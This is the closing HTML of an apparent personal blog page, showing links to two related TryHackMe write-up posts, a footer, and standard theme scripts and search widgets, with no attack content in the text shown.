2026-05-12</div><div class="title">TryHackMe_Creative</div></div></a></div><div><a href="/post/381630bb.html" title="TryHackMe_VulnNet:Internal"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-12</div><div class="title">TryHackMe_VulnNet:Internal</div></div></a></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023/03/25 - 2026 By Ananda</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><div class="js-pjax"></div><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
